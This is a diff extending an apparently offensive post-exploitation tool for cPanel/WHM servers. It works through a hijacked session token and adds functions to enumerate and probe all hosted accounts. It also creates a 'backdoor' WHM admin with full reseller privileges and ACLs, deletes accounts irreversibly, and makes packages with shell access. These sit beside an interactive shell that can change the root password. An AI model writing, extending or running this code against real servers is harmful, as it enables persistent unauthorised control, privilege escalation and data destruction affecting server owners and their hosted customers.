@@ -446,17 +446,59 @@ def whm_api(scheme, host, port, canonical, session_base, token,
 #  POST-EXPLOIT ACTIONS
 # ══════════════════════════════════════════════════════════════
 def action_list_accounts(ctx):
-    """List all cPanel accounts"""
+    """List all cPanel accounts with website status"""
+    scheme, host, port, canonical, session_base, token, timeout = ctx
+    
     log("API", "Listing all cPanel accounts...")
-    s, data = whm_api(*ctx[:6], "listaccts", {"search": "", "searchtype": "user"}, ctx[6])
+    s, data = whm_api(*ctx[:6], "listaccts", {"search": "", "searchtype": "user"}, timeout)
     if isinstance(data, dict):
         accts = data.get("data", {}).get("acct", [])
         if accts:
             log("OK", f"Found {len(accts)} cPanel accounts:")
+            safe_print(f"\n  {C.CYAN}{'USER':<20} {'DOMAIN':<35} {'STATUS':<12} EMAIL{C.RESET}")
+            safe_print(f"  {'-' * 80}")
+            
             for a in accts:
-                safe_print(f"  {C.GREEN}  user={a.get('user','?'):20s} "
-                           f"domain={a.get('domain','?'):30s} "
-                           f"email={a.get('email','?')}{C.RESET}")
+                user = a.get('user', '?')
+                domain = a.get('domain', '?')
+                email = a.get('email', '?')
+                ip = a.get('ip', None)
+                
+                # Determine status (no colors)
+                if a.get('suspended', 0) == 1:
+                    status = "SUSPENDED"
+                elif not ip or ip == '':
+                    status = "NO_IP"
+                elif domain == canonical:
+                    status = "MAIN_HOST"
+                else:
+                    # Check if website is accessible
+                    try:
+                        import urllib3
+                        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+                        http = urllib3.PoolManager(
+                            cert_reqs='CERT_NONE',
+                            assert_hostname=False,
+                            timeout=timeout,
+                            retries=urllib3.Retry(total=1, connect=1, read=1)
+                        )
+                        # Try HTTPS first, then HTTP
+                        resp = http.request('HEAD', f"https://{domain}", timeout=timeout)
+                        if resp.status in (200, 301, 302, 403, 404):
+                            status = "ACTIVE"
+                        else:
+                            status = f"DOWN({resp.status})"
+                    except:
+                        try:
+                            resp = http.request('HEAD', f"http://{domain}", timeout=timeout)
+                            if resp.status in (200, 301, 302, 403, 404):
+                                status = "ACTIVE"
+                            else:
+                                status = f"DOWN({resp.status})"
+                        except:
+                            status = "NO_RESOLVE"
+                
+                safe_print(f"  {C.GREEN}{user:<20} {C.RESET}{domain:<35} {status:<12} {email}")
         else:
             safe_print(str(data)[:1000])
     else:
@@ -584,15 +626,173 @@ def action_read_file(ctx, path: str):
     safe_print(json.dumps(data, indent=2)[:1500] if isinstance(data, dict)
                else str(data)[:1500])
 
-def action_create_user(ctx, username: str, domain: str, passwd: str):
-    """Create new cPanel account"""
+def action_create_user(ctx, username: str, domain: str, passwd: str, make_reseller: bool = False):
+    """Create new cPanel account with optional reseller privileges"""
+    scheme, host, port, canonical, session_base, token, timeout = ctx[:7]
+
     log("API", f"Creating account: {username} / {domain}")
-    s, data = whm_api(*ctx[:6], "createacct",
-                      {"username": username, "domain": domain,
-                       "password": passwd, "plan": "default"}, ctx[6],
-                      ctx[-1])
-    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
-               else str(data)[:800])
+
+    # Step 1: Create cPanel account (increase timeout for slow servers)
+    s1, data1 = whm_api(scheme, host, port, canonical, session_base, token, "createacct",
+                        {"username": username, "domain": domain,
+                         "password": passwd, "plan": "default"}, 90)
+
+    if s1 != 200:
+        log("ERR", f"Failed to create account: {s1}")
+        safe_print(json.dumps(data1, indent=2)[:800] if isinstance(data1, dict) else str(data1)[:800])
+        return
+
+    log("OK", f"Account created successfully")
+    safe_print(json.dumps(data1, indent=2)[:400] if isinstance(data1, dict) else str(data1)[:400])
+
+    # Step 2: If reseller requested, grant privileges
+    if make_reseller:
+        log("STEP", f"2. Granting reseller privileges to {username}")
+
+        reseller_perms = {
+            "user": username,
+            "makeowner": 0,
+            "reseller": 1,
+            "owner": "root",
+            "listacct": 1,
+            "showbandwidth": 1,
+            "add_pkg": 1,
+            "edit_pkg": 1,
+            "ip": 1,
+            "cgiprotection": 1,
+            "edit_dns": 1,
+            "restart": 1,
+            "kill_shell": 1,
+            "ssl": 1,
+            "res_own_setup": 1,
+            "res_own_mainip": 1,
+            "res_own_ip": 1,
+            "res_own_ip_except": 1,
+            "res_main_domain": 1,
+            "res_nameservers": 1,
+            "pass": 1
+        }
+
+        s2, data2 = whm_api(scheme, host, port, canonical, session_base, token, "setupreseller",
+                            reseller_perms, 90)
+
+        if s2 != 200:
+            log("WARN", f"Failed to setup reseller: {s2}")
+        else:
+            log("OK", f"Reseller privileges granted")
+
+    safe_print(f"\n  {C.GREEN}{C.BOLD}[CPANEL ACCOUNT CREATED]{C.RESET}")
+    safe_print(f"  Username : {username}")
+    safe_print(f"  Password : {passwd}")
+    safe_print(f"  Domain   : {domain}")
+    safe_print(f"  Reseller : {'YES' if make_reseller else 'NO'}")
+    safe_print(f"\n  {C.CYAN}Login URL: {scheme}://{canonical}:2083{C.RESET}")
+    safe_print(f"  {C.CYAN}WHM Login: {scheme}://{canonical}:2087{C.RESET}")
+
+def action_add_admin(ctx, username: str, passwd: str):
+    """Create backdoor WHM admin/reseller"""
+    scheme, host, port, canonical, session_base, token, timeout = ctx[:7]
+
+    # Generate temp domain for the admin
+    temp_domain = f"{username}.admin.local"
+
+    log("API", f"Creating backdoor admin: {username}")
+    log("STEP", f"1. Creating cPanel account: {username} / {temp_domain} (timeout: 30s)")
+
+    # Step 1: Create cPanel account with extended timeout
+    s1, data1 = whm_api(scheme, host, port, canonical, session_base, token, "createacct",
+                        {"username": username, "domain": temp_domain,
+                         "password": passwd, "plan": "default"}, 30)
+
+    if s1 != 200:
+        log("ERR", f"Failed to create account: {s1}")
+        safe_print(json.dumps(data1, indent=2)[:500] if isinstance(data1, dict) else str(data1)[:500])
+        return
+
+    log("OK", f"Account created successfully")
+    safe_print(json.dumps(data1, indent=2)[:400] if isinstance(data1, dict) else str(data1)[:400])
+
+    # Step 2: Grant reseller privileges with all permissions
+    log("STEP", f"2. Granting reseller/admin privileges to {username}")
+
+    reseller_perms = {
+        "user": username,
+        "makeowner": 0,
+        "reseller": 1,
+        "owner": "root",
+        # Grant all reseller privileges
+        "listacct": 1,
+        "showbandwidth": 1,
+        "add_pkg": 1,
+        "edit_pkg": 1,
+        "ip": 1,
+        "cgiprotection": 1,
+        "edit_dns": 1,
+        "restart": 1,
+        "kill_shell": 1,
+        "ssl": 1,
+        "res_own_setup": 1,
+        "res_own_mainip": 1,
+        "res_own_ip": 1,
+        "res_own_ip_except": 1,
+        "res_main_domain": 1,
+        "res_nameservers": 1,
+        "pass": 1
+    }
+
+    s2, data2 = whm_api(scheme, host, port, canonical, session_base, token, "setupreseller",
+                        reseller_perms, timeout)
+
+    if s2 != 200:
+        log("ERR", f"Failed to setup reseller: {s2}")
+        safe_print(json.dumps(data2, indent=2)[:500] if isinstance(data2, dict) else str(data2)[:500])
+        return
+
+    log("OK", f"Reseller privileges granted")
+    safe_print(json.dumps(data2, indent=2)[:400] if isinstance(data2, dict) else str(data2)[:400])
+
+    # Step 3: Set ACL to all (using individual flags - acllist-all=all returns empty)
+    log("STEP", f"3. Setting ACL permissions (individual flags)")
+
+    acl_params = {
+        "reseller": username,
+        "acl-all": 1,
+        "acl-create-acct": 1,
+        "acl-kill-acct": 1,
+        "acl-list-accts": 1,
+        "acl-edit-acct": 1,
+        "acl-modify-acct": 1,
+        "acl-suspend-acct": 1,
+        "acl-unsuspend-acct": 1,
+        "acl-upgrade-account": 1,
+        "acl-create-dns": 1,
+        "acl-edit-dns": 1,
+        "acl-kill-dns": 1,
+        "acl-add-pkg": 1,
+        "acl-passwd": 1,
+        "acl-quota": 1,
+        "acl-stats": 1,
+        "acl-reseller-center": 1,
+        "acl-allow-unlimited-bandwidth": 1,
+        "acl-allow-unlimited-disk-usage": 1
+    }
+
+    s3, data3 = whm_api(scheme, host, port, canonical, session_base, token, "setacls", acl_params, timeout)
+
+    if s3 != 200:
+        log("WARN", f"Failed to set ACL: {s3}")
+    else:
+        log("OK", f"ACL permissions set to 'all'")
+
+    # Summary
+    safe_print(f"\n  {C.GREEN}{C.BOLD}[BACKDOOR ADMIN CREATED]{C.RESET}")
+    safe_print(f"  Target   : {scheme}://{canonical}:{port}")
+    safe_print(f"  Username : {username}")
+    safe_print(f"  Password : {passwd}")
+    safe_print(f"  Profile  : super_admin / reseller")
+    safe_print(f"  Domain   : {temp_domain}")
+    safe_print(f"\n  {C.CYAN}Login URL: {scheme}://{canonical}:{port}{C.RESET}")
+    safe_print(f"  {C.CYAN}WHM Login: {scheme}://{canonical}:{port}/cpsess{token.replace('/cpsess', '')}/{C.RESET}")
 
 def action_version(ctx):
     """Get cPanel version"""
@@ -770,6 +970,95 @@ def save_output(findings, out_file):
     log("OK", f"Results → {out_file}")
 
 
+def action_remove_user(ctx, username: str):
+    """Remove cPanel account"""
+    scheme, host, port, canonical, session_base, token, timeout = ctx[:7]
+
+    log("API", f"Removing account: {username}")
+
+    # Increase timeout for removeacct (slow servers can take 60-180 seconds)
+    remove_timeout = min(180, timeout * 4)
+
+    s, data = whm_api(scheme, host, port, canonical, session_base, token, "removeacct",
+                      {"user": username, "keepdns": 0}, remove_timeout)
+
+    if s == 200:
+        log("OK", f"Account removed successfully")
+        safe_print(f"\n  {C.RED}{C.BOLD}[CPANEL ACCOUNT REMOVED]{C.RESET}")
+        safe_print(f"  Username : {username}")
+        safe_print(f"\n  {C.DIM}Note: This action cannot be undone.{C.RESET}")
+    else:
+        log("ERR", f"Failed to remove account: {s}")
+        safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict) else str(data)[:800])
+
+
+def action_list_packages(ctx):
+    """List all available packages"""
+    scheme, host, port, canonical, session_base, token, timeout = ctx[:7]
+
+    log("API", "Fetching package list...")
+
+    s, data = whm_api(scheme, host, port, canonical, session_base, token, "listpkgs", {}, timeout)
+
+    if s == 200:
+        pkgs = data.get("data", []) if isinstance(data, dict) and "data" in data else []
+        if pkgs:
+            safe_print(f"\n  {C.CYAN}{C.BOLD}[AVAILABLE PACKAGES]{C.RESET}")
+            safe_print(f"  {'Name':<30} {'Quota (MB)':<15} {'Bandwidth (MB)':<20}")
+            safe_print(f"  {'-'*65}")
+            for pkg in pkgs[:50]:  # Limit to 50 packages
+                name = pkg.get("name", "N/A")
+                quota = pkg.get("quota", "unlimited") or "unlimited"
+                bw = pkg.get("bwlimit", "unlimited") or "unlimited"
+                safe_print(f"  {name:<30} {quota:<15} {bw:<20}")
+        else:
+            safe_print(f"\n  {C.DIM}No packages found.{C.RESET}")
+    else:
+        log("ERR", f"Failed to fetch packages: {s}")
+
+
+def action_create_package(ctx, name: str, domain: str = "0", quota: str = "unlimited", bwlimit: str = "unlimited"):
+    """Create a new package with full privileges"""
+    scheme, host, port, canonical, session_base, token, timeout = ctx[:7]
+
+    log("API", f"Creating package: {name}")
+
+    # Create package with full permissions
+    pkg_params = {
+        "name": name,
+        "package": name,
+        "quota": quota,
+        "bwlimit": bwlimit,
+        "maxftp": "unlimited",
+        "maxsql": "unlimited",
+        "maxpop": "unlimited",
+        "maxlst": "unlimited",
+        "maxsub": "unlimited",
+        "maxpark": "unlimited",
+        "maxaddon": "unlimited",
+        "maxparked": "unlimited",
+        "maxaddon": "unlimited",
+        "cgi": "y",
+        "cpmod": "x3",
+        "hasshell": "y",
+        "noremotedomains": "n",
+        "language": "en",
+    }
+
+    s, data = whm_api(scheme, host, port, canonical, session_base, token, "addpkg", pkg_params, timeout)
+
+    if s == 200:
+        log("OK", f"Package created successfully")
+        safe_print(f"\n  {C.GREEN}{C.BOLD}[PACKAGE CREATED]{C.RESET}")
+        safe_print(f"  Name     : {name}")
+        safe_print(f"  Quota    : {quota}")
+        safe_print(f"  Bandwidth: {bwlimit}")
+        safe_print(f"  Features : Full privileges (FTP, SQL, Email, Addon domains, etc.)")
+    else:
+        log("ERR", f"Failed to create package: {s}")
+        safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict) else str(data)[:800])
+
+
 # ══════════════════════════════════════════════════════════════
 #  INTERACTIVE WHM SHELL
 # ══════════════════════════════════════════════════════════════
@@ -782,7 +1071,11 @@ def whm_shell(ctx):
       ls [path]                         → file listing (fileman)
       cat [path]                        → file read (fileman)
       accounts                          → list cPanel accounts
+      adduser <u> <d> <p> [--reseller]  → create cPanel account (option with reseller)
+      deluser <username>                → remove cPanel account
       addadmin <user> <pass>            → add backdoor admin
+      listpackages                      → list all available packages
+      createpackage <name>              → create package with full privileges
       passwd <newpass>                  → change root password
       help                              → show commands
       exit / quit                       → exit shell
@@ -825,9 +1118,17 @@ def whm_shell(ctx):
     ls [path]         List directory
 
   {C.CYAN}Account Management:{C.RESET}
-    accounts          List all cPanel accounts
-    addadmin <u> <p>  Create backdoor admin
-    passwd <pass>     Change root password
+    accounts                          List all cPanel accounts
+    adduser <u> <d> <p> [--reseller]  Create cPanel account (option with reseller)
+    deluser <username>                Remove cPanel account
+    addadmin <u> <p>                  Create backdoor admin
+
+  {C.CYAN}Package Management:{C.RESET}
+    listpackages                      List all available packages
+    createpackage <name>              Create package with full privileges
+
+  {C.CYAN}Server:{C.RESET}
+    passwd <pass>                     Change root password
 
   {C.CYAN}API (raw):{C.RESET}
     api <endpoint> [param=value ...]
@@ -914,6 +1215,32 @@ def whm_shell(ctx):
                     print("  Usage: addadmin <username> <password>")
                     continue
                 action_add_admin(ctx, parts2[0], parts2[1])
+
+            elif cmd == "adduser":
+                parts2 = arg.split()
+                if len(parts2) < 3:
+                    print("  Usage: adduser <username> <domain> <password> [--reseller]")
+                    continue
+                username = parts2[0]
+                domain = parts2[1]
+                password = parts2[2]
+                make_reseller = "--reseller" in parts2
+                action_create_user(ctx, username, domain, password, make_reseller)
+
+            elif cmd in ("deluser", "removeuser", "deleteuser"):
+                if not arg:
+                    print("  Usage: deluser <username>")
+                    continue
+                action_remove_user(ctx, arg)
+
+            elif cmd == "listpackages":
+                action_list_packages(ctx)
+
+            elif cmd in ("createpackage", "addpackage", "mkpkg"):
+                if not arg:
+                    print("  Usage: createpackage <name>")
+                    continue
+                action_create_package(ctx, arg)
 
             elif cmd == "passwd":
                 if not arg:
